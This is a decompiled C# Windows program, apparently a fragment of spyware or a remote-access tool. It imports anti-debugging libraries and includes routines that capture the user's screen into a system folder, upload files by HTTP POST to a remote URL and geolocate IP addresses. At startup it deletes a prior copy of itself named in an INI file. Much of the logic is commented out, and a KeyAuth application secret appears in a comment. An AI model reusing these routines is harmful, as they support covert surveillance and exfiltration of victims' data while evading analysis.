using System;
using System.Collections.Specialized;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Speech.Synthesis;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using Anti_DebugNET.AntiDebug;
using Anti_DebugNET.AntiDebugTools;

namespace numer
{
	// Token: 0x02000037 RID: 55
	internal static class Program
	{
		// Token: 0x060001AE RID: 430
		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool SystemParametersInfo(int uiAction, int uiParam, ref int pvParam, int fWinIni);

		// Token: 0x060001AF RID: 431 RVA: 0x00002B51 File Offset: 0x00000D51
		public static string IsoCountryCodeToFlagEmoji1(string countryCode)
		{
			return string.Concat(from x in countryCode.ToUpper()
			select char.ConvertFromUtf32((int)x + 127397));
		}

		// Token: 0x060001B0 RID: 432 RVA: 0x0000FD18 File Offset: 0x0000DF18
		public static string GetFlag(string country)
		{
			RegionInfo regionInfo = (from x in CultureInfo.GetCultures(CultureTypes.SpecificCultures)
			select new RegionInfo(x.LCID)).FirstOrDefault((RegionInfo region) => region.EnglishName.Contains(country));
			if (regionInfo == null)
			{
				return "\ud83c\udff3";
			}
			return Program.IsoCountryCodeToFlagEmoji1(regionInfo.TwoLetterISORegionName);
		}

		// Token: 0x060001B1 RID: 433 RVA: 0x0000FD84 File Offset: 0x0000DF84
		public static string IPRequestHelper(string url)
		{
			StreamReader streamReader = new StreamReader(((HttpWebResponse)((HttpWebRequest)WebRequest.Create(url)).GetResponse()).GetResponseStream());
			string result = streamReader.ReadToEnd();
			streamReader.Close();
			streamReader.Dispose();
			return result;
		}

		// Token: 0x060001B2 RID: 434 RVA: 0x0000FDC4 File Offset: 0x0000DFC4
		public static string GetCountryByIP(string ipAddress)
		{
			string xml = Program.IPRequestHelper("http://ip-api.com/xml/" + ipAddress);
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(xml);
			XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("query");
			new NameValueCollection().Add(elementsByTagName.Item(0).ChildNodes[2].InnerText, elementsByTagName.Item(0).ChildNodes[2].Value);
			return elementsByTagName.Item(0).ChildNodes[1].InnerText.ToString();
		}

		// Token: 0x060001B3 RID: 435 RVA: 0x0000FE50 File Offset: 0x0000E050
		private static void CaptureMyScreen()
		{
			try
			{
				Path.GetTempPath();
				string name = WindowsIdentity.GetCurrent().Name;
				Bitmap bitmap = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb);
				Rectangle bounds = Screen.AllScreens[0].Bounds;
				Graphics.FromImage(bitmap).CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
				bitmap.Save("C:\\Windows\\Setup\\\\open.jpg", ImageFormat.Jpeg);
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060001B4 RID: 436 RVA: 0x0000FEE0 File Offset: 0x0000E0E0
		private static void sendImg(string url, string filePath)
		{
			HttpClient httpClient = new HttpClient();
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			byte[] array = File.ReadAllBytes(filePath);
			multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), Path.GetExtension(filePath), filePath);
			httpClient.PostAsync(url, multipartFormDataContent).Wait();
			httpClient.Dispose();
		}

		// Token: 0x060001B5 RID: 437 RVA: 0x0000FF28 File Offset: 0x0000E128
		public static void test2()
		{
			////Program.<test2>d__9 <test2>d__;
			////<test2>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			////<test2>d__.<>1__state = -1;
			////<test2>d__.<>t__builder.Start<Program.<test2>d__9>(ref <test2>d__);
		}

		// Token: 0x060001B6 RID: 438
		[DllImport("kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool AllocConsole();

		// Token: 0x060001B7 RID: 439 RVA: 0x0000FF58 File Offset: 0x0000E158
		[STAThread]
		private static void Main()
		{
			//Thread thread = new Thread(new ThreadStart(Program.<Main>g__khaled1|12_0));
            //Program.timer = new System.Threading.Timer(new TimerCallback(Program.<Main>g__DoProcess|12_1), null, 0, 2000);
			Program.test2();
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\location.ini";
			if (File.Exists(path))
			{
				string text = File.ReadAllText(path);
				if (text != Assembly.GetExecutingAssembly().Location)
				{
					try
					{
						File.Delete(text);
					}
					catch
					{
					}
				}
				File.Delete(path);
			}
	
		}

		// Token: 0x060001B9 RID: 441 RVA: 0x00010124 File Offset: 0x0000E324
		[CompilerGenerated]
		//internal static void <Main>g__khaled1|12_0()
		//{
		//	Program.<<Main>g__khaled1|12_0>d <<Main>g__khaled1|12_0>d;
		//	<<Main>g__khaled1|12_0>d.<>t__builder = AsyncVoidMethodBuilder.Create();
		//	<<Main>g__khaled1|12_0>d.<>1__state = -1;
		//	<<Main>g__khaled1|12_0>d.<>t__builder.Start<Program.<<Main>g__khaled1|12_0>d>(ref <<Main>g__khaled1|12_0>d);
		//}

		// Token: 0x060001BA RID: 442 RVA: 0x00010154 File Offset: 0x0000E354
		

		// Token: 0x060001BB RID: 443 RVA: 0x00002986 File Offset: 0x00000B86



		// Token: 0x040003B2 RID: 946
		//public static api KeyAuthApp = new api("mario", "3e16x9Bluk", "846861ab9f970088146278d47f20c79974be26bdc4b2a854eb33fd6d3cff0375", "1.0");

		// Token: 0x040003B3 RID: 947
		private const int SPI_GET_REMOTESESSION = 4096;

		// Token: 0x040003B4 RID: 948
		private static System.Threading.Timer timer;
	}
}
